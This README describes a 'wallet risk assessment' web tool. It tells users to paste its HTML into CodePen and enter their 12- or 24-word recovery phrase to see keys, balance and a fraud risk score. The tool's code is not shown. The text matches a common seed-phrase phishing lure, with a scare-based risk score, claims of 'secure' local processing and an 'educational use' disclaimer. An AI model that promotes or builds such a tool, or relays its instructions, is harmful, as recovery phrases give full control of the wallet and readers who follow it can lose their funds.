
<img src="https://i.ibb.co/nNRBrhZG/wegerw.png" alt="Safe with Key" style="display: block; margin-left: auto; margin-right: auto; width: 100px;">

# Wallet Data Extraction and Risk Assessment Tool

## Overview
This is a secure, local HTML tool running in an independent CodePen service. It enables users to input a wallet recovery phrase (12 or 24 words) to retrieve the associated key, address, and balance on Ethereum Mainnet or BNB Chain Mainnet. The tool also displays a **Wallet Risk Score** on a speedometer with risk zones.

## Functionality
- **Phrase Processing**: Input a 12 or 24-word recovery phrase to obtain the key, address, and balance.
- **Network Selection**: Supports Ethereum Mainnet and BNB Chain Mainnet.
- **Risk Score**: Shows the wallet's risk level on a 0–1000 scale with zones:
  - 0–400: Critical Risk
  - 400–600: High Risk
  - 600–800: Medium Risk
  - 800–1000: Very Low Risk

  > The Risk Score evaluates wallet activity on the blockchain, indicating potential links to fraud, illicit activities, or sanctions. A low score (0–400) suggests high risk, while a high score (800–1000) indicates low risk.

- **Security**: Operates locally in CodePen for independent and secure data processing.

## Usage
1. Open the tool in [CodePen](https://codepen.io/pen/) by pasting the code from the `index.html` file: [index.html](index.html) into the HTML block.
2. Enter a valid recovery phrase (12 or 24 words) in the text field.
3. Select the network (Ethereum or BNB Chain).
4. Click "Retrieve Data" to view the key, address, balance, and Risk Score.
5. Hover over the "i" icon for Risk Score details.

## Security Warning
- **Sensitive Data**: The tool processes recovery phrases and keys client-side.
- **Usage**: Intended for educational purposes in a secure CodePen environment. Avoid using in production without additional security measures.

## License
For educational use only. Use at your own risk.
